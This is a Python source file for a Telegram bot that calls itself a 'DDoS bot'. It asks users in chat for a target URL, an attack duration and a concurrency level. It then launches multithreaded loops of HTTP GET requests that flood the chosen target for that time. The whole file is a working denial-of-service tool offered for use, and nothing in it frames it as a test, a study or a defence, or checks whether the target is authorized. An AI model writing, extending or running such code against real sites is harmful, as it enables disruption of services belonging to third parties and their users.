# bot.py
import os
import telebot
from telebot import types
import time
import threading
import requests

API_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
bot = telebot.TeleBot(API_TOKEN)

# Global dictionary to store user inputs
user_inputs = {}

# Function to perform DDoS attack
def ddos_attack(target, duration, concurrency):
    threads = []
    for _ in range(concurrency):
        t = threading.Thread(target=send_requests, args=(target, duration))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()

# Function to send requests continuously
def send_requests(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            requests.get(target)
        except Exception as e:
            print(f"Error: {e}")

# Handler for /start command
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Welcome to the DDoS bot! Please provide the target URL.")
    user_inputs[message.chat.id] = {}
    user_inputs[message.chat.id]['step'] = 1

# Handler for target URL
@bot.message_handler(func=lambda message: user_inputs.get(message.chat.id) and user_inputs[message.chat.id]['step'] == 1)
def get_target_url(message):
    user_inputs[message.chat.id]['target'] = message.text
    bot.send_message(message.chat.id, "Please provide the attack duration (in seconds).")
    user_inputs[message.chat.id]['step'] = 2

# Handler for attack duration
@bot.message_handler(func=lambda message: user_inputs.get(message.chat.id) and user_inputs[message.chat.id]['step'] == 2)
def get_attack_duration(message):
    user_inputs[message.chat.id]['duration'] = int(message.text)
    bot.send_message(message.chat.id, "Please provide the concurrency level.")
    user_inputs[message.chat.id]['step'] = 3

# Handler for concurrency level
@bot.message_handler(func=lambda message: user_inputs.get(message.chat.id) and user_inputs[message.chat.id]['step'] == 3)
def get_concurrency(message):
    user_inputs[message.chat.id]['concurrency'] = int(message.text)
    # Start the DDoS attack with user-provided parameters
    threading.Thread(target=ddos_attack, args=(user_inputs[message.chat.id]['target'], 
                                                user_inputs[message.chat.id]['duration'], 
                                                user_inputs[message.chat.id]['concurrency'])).start()
    bot.send_message(message.chat.id, f"DDoS attack started on {user_inputs[message.chat.id]['target']} for {user_inputs[message.chat.id]['duration']} seconds with concurrency {user_inputs[message.chat.id]['concurrency']}.")

# Run the bot continuously
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)  # Wait for 5 seconds before retrying
